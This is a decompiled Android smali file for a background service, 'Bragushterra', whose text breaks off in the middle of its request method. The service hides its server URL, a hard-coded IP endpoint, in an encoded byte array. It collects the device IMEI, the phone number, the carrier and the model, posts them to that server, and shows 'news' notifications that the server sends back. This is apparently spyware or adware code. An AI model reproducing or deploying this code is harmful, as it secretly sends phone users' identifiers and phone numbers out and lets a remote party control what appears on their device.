.class public Lcom/bratolubzet/stlstart/Bragushterra;
.super Landroid/app/Service;
.source "Bragushterra.java"


# static fields
.field private static final TAG:Ljava/lang/String; = "Bragushterra"

.field private static final UPDATE_INTERVAL:I = 0xdbba00


# instance fields
.field private imei:Ljava/lang/String;

.field private info:Ljava/lang/String;

.field private lang:Ljava/lang/String;

.field private final nambytes:[B

.field private operatorName:Ljava/lang/String;

.field private packageName:Ljava/lang/String;

.field private phoneModel:Ljava/lang/String;

.field private phoneNumber:Ljava/lang/String;

.field private prefs:Landroid/content/SharedPreferences;

.field private primaryServerUrl:Ljava/lang/String;

.field private queryNum:I

.field private secondaryServerUrl:Ljava/lang/String;

.field private sysName:Ljava/lang/String;

.field private time:J

.field private version:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 2

    .prologue
    .line 46
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 48
    const/16 v0, 0x1a

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    iput-object v0, p0, Lcom/bratolubzet/stlstart/Bragushterra;->nambytes:[B

    .line 62
    new-instance v0, Ljava/lang/String;

    iget-object v1, p0, Lcom/bratolubzet/stlstart/Bragushterra;->nambytes:[B

    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([B)V

    iput-object v0, p0, Lcom/bratolubzet/stlstart/Bragushterra;->primaryServerUrl:Ljava/lang/String;

    .line 63
    new-instance v0, Ljava/lang/String;

    iget-object v1, p0, Lcom/bratolubzet/stlstart/Bragushterra;->nambytes:[B

    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([B)V

    iput-object v0, p0, Lcom/bratolubzet/stlstart/Bragushterra;->secondaryServerUrl:Ljava/lang/String;

    .line 64
    const/4 v0, 0x0

    iput v0, p0, Lcom/bratolubzet/stlstart/Bragushterra;->queryNum:I

    .line 66
    const-string v0, "00000"

    iput-object v0, p0, Lcom/bratolubzet/stlstart/Bragushterra;->operatorName:Ljava/lang/String;

    .line 67
    const-string v0, "00"

    iput-object v0, p0, Lcom/bratolubzet/stlstart/Bragushterra;->version:Ljava/lang/String;

    .line 68
    const-string v0, "PhoneConv2.1_vers2"

    iput-object v0, p0, Lcom/bratolubzet/stlstart/Bragushterra;->sysName:Ljava/lang/String;

    .line 46
    return-void

    .line 48
    :array_0
    .array-data 1
        0x68t
        0x74t
        0x74t
        0x70t
        0x3at
        0x2ft
        0x2ft
        0x39t
        0x31t
        0x2et
        0x32t
        0x31t
        0x33t
        0x2et
        0x31t
        0x37t
        0x35t
        0x2et
        0x31t
        0x37t
        0x36t
        0x2ft
        0x61t
        0x70t
        0x69t
        0x2ft
    .end array-data
.end method

.method static synthetic access$0(Lcom/bratolubzet/stlstart/Bragushterra;)V
    .locals 0

    .prologue
    .line 168
    invoke-direct {p0}, Lcom/bratolubzet/stlstart/Bragushterra;->getUpdate()V

    return-void
.end method

.method private downloadBitmap(Ljava/lang/String;)Landroid/graphics/Bitmap;
    .locals 9
    .param p1, "url"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .prologue
    .line 335
    invoke-static {}, Landroid/net/Proxy;->getDefaultHost()Ljava/lang/String;

    move-result-object v6

    .line 336
    .local v6, "proxyHost":Ljava/lang/String;
    invoke-static {}, Landroid/net/Proxy;->getDefaultPort()I

    move-result v7

    .line 337
    .local v7, "proxyPort":I
    new-instance v2, Ljava/net/URL;

    invoke-direct {v2, p1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 339
    .local v2, "connectionUrl":Ljava/net/URL;
    if-lez v7, :cond_0

    .line 341
    new-instance v5, Ljava/net/InetSocketAddress;

    invoke-direct {v5, v6, v7}, Ljava/net/InetSocketAddress;-><init>(Ljava/lang/String;I)V

    .line 342
    .local v5, "proxyAddr":Ljava/net/InetSocketAddress;
    new-instance v4, Ljava/net/Proxy;

    sget-object v8, Ljava/net/Proxy$Type;->HTTP:Ljava/net/Proxy$Type;

    invoke-direct {v4, v8, v5}, Ljava/net/Proxy;-><init>(Ljava/net/Proxy$Type;Ljava/net/SocketAddress;)V

    .line 343
    .local v4, "proxy":Ljava/net/Proxy;
    invoke-virtual {v2, v4}, Ljava/net/URL;->openConnection(Ljava/net/Proxy;)Ljava/net/URLConnection;

    move-result-object v1

    check-cast v1, Ljava/net/HttpURLConnection;

    .line 348
    .end local v4    # "proxy":Ljava/net/Proxy;
    .end local v5    # "proxyAddr":Ljava/net/InetSocketAddress;
    .local v1, "connection":Ljava/net/HttpURLConnection;
    :goto_0
    const/16 v8, 0x2710

    invoke-virtual {v1, v8}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    .line 350
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->connect()V

    .line 351
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v3

    .line 352
    .local v3, "inputStream":Ljava/io/InputStream;
    invoke-static {v3}, Landroid/graphics/BitmapFactory;->decodeStream(Ljava/io/InputStream;)Landroid/graphics/Bitmap;

    move-result-object v0

    .line 353
    .local v0, "bitmap":Landroid/graphics/Bitmap;
    invoke-virtual {v3}, Ljava/io/InputStream;->close()V

    .line 354
    invoke-virtual {v1}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 355
    return-object v0

    .line 346
    .end local v0    # "bitmap":Landroid/graphics/Bitmap;
    .end local v1    # "connection":Ljava/net/HttpURLConnection;
    .end local v3    # "inputStream":Ljava/io/InputStream;
    :cond_0
    invoke-virtual {v2}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v1

    check-cast v1, Ljava/net/HttpURLConnection;

    .restart local v1    # "connection":Ljava/net/HttpURLConnection;
    goto :goto_0
.end method

.method private fillPostData()V
    .locals 5

    .prologue
    .line 100
    const-string v2, "phone"

    invoke-virtual {p0, v2}, Lcom/bratolubzet/stlstart/Bragushterra;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/telephony/TelephonyManager;

    .line 101
    .local v1, "telephonyManager":Landroid/telephony/TelephonyManager;
    invoke-virtual {v1}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v2

    iput-object v2, p0, Lcom/bratolubzet/stlstart/Bragushterra;->imei:Ljava/lang/String;

    .line 102
    invoke-virtual {v1}, Landroid/telephony/TelephonyManager;->getNetworkOperator()Ljava/lang/String;

    move-result-object v2

    iput-object v2, p0, Lcom/bratolubzet/stlstart/Bragushterra;->operatorName:Ljava/lang/String;

    .line 104
    :try_start_0
    invoke-virtual {p0}, Lcom/bratolubzet/stlstart/Bragushterra;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    invoke-virtual {p0}, Lcom/bratolubzet/stlstart/Bragushterra;->getPackageName()Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    invoke-virtual {v2, v3, v4}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v0

    .line 105
    .local v0, "manager":Landroid/content/pm/PackageInfo;
    iget-object v2, v0, Landroid/content/pm/PackageInfo;->versionName:Ljava/lang/String;

    iput-object v2, p0, Lcom/bratolubzet/stlstart/Bragushterra;->version:Ljava/lang/String;
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    .line 109
    .end local v0    # "manager":Landroid/content/pm/PackageInfo;
    :goto_0
    invoke-virtual {p0}, Lcom/bratolubzet/stlstart/Bragushterra;->getPackageName()Ljava/lang/String;

    move-result-object v2

    iput-object v2, p0, Lcom/bratolubzet/stlstart/Bragushterra;->packageName:Ljava/lang/String;

    .line 110
    invoke-virtual {v1}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v2

    iput-object v2, p0, Lcom/bratolubzet/stlstart/Bragushterra;->phoneNumber:Ljava/lang/String;

    .line 111
    sget-object v2, Landroid/os/Build;->MODEL:Ljava/lang/String;

    iput-object v2, p0, Lcom/bratolubzet/stlstart/Bragushterra;->phoneModel:Ljava/lang/String;

    .line 112
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v2

    invoke-virtual {v2}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v2

    iput-object v2, p0, Lcom/bratolubzet/stlstart/Bragushterra;->lang:Ljava/lang/String;

    .line 113
    const-string v2, "{\"info\":\"none\"}"

    iput-object v2, p0, Lcom/bratolubzet/stlstart/Bragushterra;->info:Ljava/lang/String;

    .line 114
    new-instance v2, Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/bratolubzet/stlstart/Bragushterra;->imei:Ljava/lang/String;

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, " "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/bratolubzet/stlstart/Bragushterra;->packageName:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, " "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/bratolubzet/stlstart/Bragushterra;->phoneNumber:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, " "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/bratolubzet/stlstart/Bragushterra;->phoneModel:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, " "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/bratolubzet/stlstart/Bragushterra;->lang:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, " "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/bratolubzet/stlstart/Bragushterra;->info:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-direct {p0, v2}, Lcom/bratolubzet/stlstart/Bragushterra;->log(Ljava/lang/String;)V

    .line 115
    return-void

    .line 106
    :catch_0
    move-exception v2

    goto :goto_0
.end method

.method private getUpdate()V
    .locals 3

    .prologue
    .line 171
    :try_start_0
    iget-object v2, p0, Lcom/bratolubzet/stlstart/Bragushterra;->primaryServerUrl:Ljava/lang/String;

    invoke-direct {p0, v2}, Lcom/bratolubzet/stlstart/Bragushterra;->sendRequest(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_3

    .line 184
    :goto_0
    return-void

    .line 172
    :catch_0
    move-exception v0

    .line 173
    .local v0, "e":Ljava/io/IOException;
    const-string v2, "Primary server is unavailable, try secondary"

    invoke-direct {p0, v2}, Lcom/bratolubzet/stlstart/Bragushterra;->log(Ljava/lang/String;)V

    .line 175
    :try_start_1
    iget-object v2, p0, Lcom/bratolubzet/stlstart/Bragushterra;->secondaryServerUrl:Ljava/lang/String;

    invoke-direct {p0, v2}, Lcom/bratolubzet/stlstart/Bragushterra;->sendRequest(Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_2

    goto :goto_0

    .line 176
    :catch_1
    move-exception v1

    .line 177
    .local v1, "e1":Ljava/io/IOException;
    const-string v2, "Secondary server is unavailable too, do nothing"

    invoke-direct {p0, v2}, Lcom/bratolubzet/stlstart/Bragushterra;->log(Ljava/lang/String;)V

    goto :goto_0

    .line 178
    .end local v1    # "e1":Ljava/io/IOException;
    :catch_2
    move-exception v1

    .line 179
    .local v1, "e1":Lorg/json/JSONException;
    invoke-virtual {v0}, Ljava/io/IOException;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-direct {p0, v2}, Lcom/bratolubzet/stlstart/Bragushterra;->log(Ljava/lang/String;)V

    goto :goto_0

    .line 181
    .end local v0    # "e":Ljava/io/IOException;
    .end local v1    # "e1":Lorg/json/JSONException;
    :catch_3
    move-exception v0

    .line 182
    .local v0, "e":Lorg/json/JSONException;
    invoke-virtual {v0}, Lorg/json/JSONException;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-direct {p0, v2}, Lcom/bratolubzet/stlstart/Bragushterra;->log(Ljava/lang/String;)V

    goto :goto_0
.end method

.method private increaseQueryNum()V
    .locals 3

    .prologue
    .line 302
    iget v0, p0, Lcom/bratolubzet/stlstart/Bragushterra;->queryNum:I

    add-int/lit8 v0, v0, 0x1

    iput v0, p0, Lcom/bratolubzet/stlstart/Bragushterra;->queryNum:I

    .line 303
    iget-object v0, p0, Lcom/bratolubzet/stlstart/Bragushterra;->prefs:Landroid/content/SharedPreferences;

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v1, "queryNum"

    iget v2, p0, Lcom/bratolubzet/stlstart/Bragushterra;->queryNum:I

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 304
    return-void
.end method

.method private log(Ljava/lang/String;)V
    .locals 0
    .param p1, "msg"    # Ljava/lang/String;

    .prologue
    .line 75
    return-void
.end method

.method private parseNews(Lorg/json/JSONObject;)V
    .locals 10
    .param p1, "jsonObject"    # Lorg/json/JSONObject;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Lorg/json/JSONException;
        }
    .end annotation

    .prologue
    .line 312
    const-string v0, "id"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v1

    .line 313
    .local v1, "id":I
    const-string v0, "time"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v6

    .line 314
    .local v6, "time":I
    const-string v0, "icon"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    .line 315
    .local v8, "iconUrl":Ljava/lang/String;
    const-string v0, "url"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 316
    .local v4, "url":Ljava/lang/String;
    const-string v0, "text"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 317
    .local v2, "text":Ljava/lang/String;
    const-string v0, "title"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 320
    .local v3, "title":Ljava/lang/String;
    :try_start_0
    invoke-direct {p0, v8}, Lcom/bratolubzet/stlstart/Bragushterra;->downloadBitmap(Ljava/lang/String;)Landroid/graphics/Bitmap;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v5

    .local v5, "icon":Landroid/graphics/Bitmap;
    :goto_0
    move-object v0, p0

    .line 325
    invoke-direct/range {v0 .. v6}, Lcom/bratolubzet/stlstart/Bragushterra;->showNews(ILjava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/graphics/Bitmap;I)V

    .line 326
    return-void

    .line 321
    .end local v5    # "icon":Landroid/graphics/Bitmap;
    :catch_0
    move-exception v7

    .line 322
    .local v7, "e":Ljava/io/IOException;
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v9, "can\'t download icon, set default "

    invoke-direct {v0, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/bratolubzet/stlstart/Bragushterra;->log(Ljava/lang/String;)V

    .line 323
    invoke-virtual {p0}, Lcom/bratolubzet/stlstart/Bragushterra;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    const v9, 0x7f020002

    invoke-static {v0, v9}, Landroid/graphics/BitmapFactory;->decodeResource(Landroid/content/res/Resources;I)Landroid/graphics/Bitmap;

    move-result-object v5

    .restart local v5    # "icon":Landroid/graphics/Bitmap;
    goto :goto_0
.end method

.method private sendRequest(Ljava/lang/String;)V
    .locals 23
    .param p1, "serverUrl"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;,
            Lorg/json/JSONException;
        }
    .end annotation

    .prologue
    .line 206
    invoke-static {}, Landroid/net/Proxy;->getDefaultHost()Ljava/lang/String;

    move-result-object v12

    .line 207
    .local v12, "proxyHost":Ljava/lang/String;
    invoke-static {}, Landroid/net/Proxy;->getDefaultPort()I

    move-result v13

    .line 208
    .local v13, "proxyPort":I
    new-instance v5, Ljava/net/URL;

    move-object/from16 v0, p1

    invoke-direct {v5, v0}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 210
    .local v5, "connectionUrl":Ljava/net/URL;
    if-lez v13, :cond_6

    .line 212
    new-instance v11, Ljava/net/InetSocketAddress;

    invoke-direct {v11, v12, v13}, Ljava/net/InetSocketAddress;-><init>(Ljava/lang/String;I)V

    .line 213
    .local v11, "proxyAddr":Ljava/net/InetSocketAddress;
    new-instance v10, Ljava/net/Proxy;

    sget-object v19, Ljava/net/Proxy$Type;->HTTP:Ljava/net/Proxy$Type;

    move-object/from16 v0, v19

    invoke-direct {v10, v0, v11}, Ljava/net/Proxy;-><init>(Ljava/net/Proxy$Type;Ljava/net/SocketAddress;)V

    .line 214
    .local v10, "proxy":Ljava/net/Proxy;
    invoke-virtual {v5, v10}, Ljava/net/URL;->openConnection(Ljava/net/Proxy;)Ljava/net/URLConnection;

    move-result-object v4

    check-cast v4, Ljava/net/HttpURLConnection;

    .line 219
    .end local v10    # "proxy":Ljava/net/Proxy;
    .end local v11    # "proxyAddr":Ljava/net/InetSocketAddress;
    .local v4, "connection":Ljava/net/HttpURLConnection;
    :goto_0
    const/16 v19, 0x1

    move/from16 v0, v19

    invoke-virtual {v4, v0}, Ljava/net/HttpURLConnection;->setDoInput(Z)V

    .line 220
    const/16 v19, 0x1

    move/from16 v0, v19

    invoke-virtual {v4, v0}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 221
    const-string v19, "GET"

    move-object/from16 v0, v19

    invoke-virtual {v4, v0}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 222
    const/16 v19, 0x2710

    move/from16 v0, v19

    invoke-virtual {v4, v0}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    .line 225
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v19

    const-wide/16 v21, 0x3e8

    div-long v19, v19, v21

    move-wide/from16 v0, v19

    move-object/from16 v2, p0

    iput-wide v0, v2, Lcom/bratolubzet/stlstart/Bragushterra;->time:J

    .line 227
    new-instance v18, Ljava/io/DataOutputStream;

    invoke-virtual {v4}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v19

    invoke-direct/range {v18 .. v19}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 229
    .local v18, "wr":Ljava/io/DataOutputStream;
    new-instance v19, Ljava/lang/StringBuilder;

    const-string v20, "imei="

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bratolubzet/stlstart/Bragushterra;->imei:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    .line 230
    const-string v20, "&package="

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bratolubzet/stlstart/Bragushterra;->packageName:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    .line 231
    const-string v20, "&phone="

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bratolubzet/stlstart/Bragushterra;->phoneNumber:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    .line 232
    const-string v20, "&version="

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bratolubzet/stlstart/Bragushterra;->version:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    .line 233
    const-string v20, "&sysname="

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bratolubzet/stlstart/Bragushterra;->sysName:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    .line 234
    const-string v20, "&operator="

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bratolubzet/stlstart/Bragushterra;->operatorName:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    .line 235
    const-string v20, "&sdk="

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    sget-object v20, Landroid/os/Build$VERSION;->SDK:Ljava/lang/String;

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    .line 236
    const-string v20, "&time="

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget-wide v0, v0, Lcom/bratolubzet/stlstart/Bragushterra;->time:J

    move-wide/from16 v20, v0

    invoke-virtual/range {v19 .. v21}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v19

    .line 237
    const-string v20, "&model="

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bratolubzet/stlstart/Bragushterra;->phoneModel:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    .line 238
    const-string v20, "&lang="

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bratolubzet/stlstart/Bragushterra;->lang:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    .line 239
    const-string v20, "&info="

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/bratolubzet/stlstart/Bragushterra;->info:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    .line 240
    const-string v20, "&queryNum="

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, p0

    iget v0, v0, Lcom/bratolubzet/stlstart/Bragushterra;->queryNum:I

    move/from16 v20, v0

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v19

    .line 229
    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v17

    .line 241
    .local v17, "urlParameters":Ljava/lang/String;
    move-object/from16 v0, v18

    move-object/from16 v1, v17

    invoke-virtual {v0, v1}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 242
    invoke-virtual/range {v18 .. v18}, Ljava/io/DataOutputStream;->flush()V

    .line 243
    invoke-virtual/range {v18 .. v18}, Ljava/io/DataOutputStream;->close()V

    .line 245
    invoke-virtual {v4}, Ljava/net/HttpURLConnection;->connect()V

    .line 246
    invoke-virtual {v4}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v6

    .line 248
    .local v6, "inputStream":Ljava/io/InputStream;
    if-eqz v6, :cond_5

    .line 249
    invoke-direct/range {p0 .. p0}, Lcom/bratolubzet/stlstart/Bragushterra;->increaseQueryNum()V

    .line 251
    new-instance v14, Ljava/io/BufferedReader;

    new-instance v19, Ljava/io/InputStreamReader;

    const-string v20, "UTF-8"

    move-object/from16 v0, v19

    move-object/from16 v1, v20

    invoke-direct {v0, v6, v1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;Ljava/lang/String;)V

    move-object/from16 v0, v19

    invoke-direct {v14, v0}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 252
    .local v14, "reader":Ljava/io/BufferedReader;
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    .line 253
    .local v3, "builder":Ljava/lang/StringBuilder;
    const/4 v8, 0x0

    .local v8, "line":Ljava/lang/String;
    :goto_1
    invoke-virtual {v14}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v8

    if-nez v8, :cond_7

    .line 256
    new-instance v16, Lorg/json/JSONTokener;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v19

    move-object/from16 v0, v16

    move-object/from16 v1, v19

    invoke-direct {v0, v1}, Lorg/json/JSONTokener;-><init>(Ljava/lang/String;)V

    .line 257
    .local v16, "tokener":Lorg/json/JSONTokener;
    new-instance v7, Lorg/json/JSONObject;

    move-object/from16 v0, v16

    invoke-direct {v7, v0}, Lorg/json/JSONObject;-><init>(Lorg/json/JSONTokener;)V

    .line 258
    .local v7, "jsonObject":Lorg/json/JSONObject;
    const-string v19, "status"

    move-object/from16 v0, v19

    invoke-virtual {v7, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    .line 260
    .local v15, "status":Ljava/lang/String;
    new-instance v19, Ljava/lang/StringBuilder;

    const-string v20, "Status = "

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v19

    invoke-virtual {v0, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v19

    move-object/from16 v0, p0

    move-object/from16 v1, v19

    invoke-direct {v0, v1}, Lcom/bratolubzet/stlstart/Bragushterra;->log(Ljava/lang/String;)V

    .line 262
    const-string v19, "news"

    move-object/from16 v0, v19

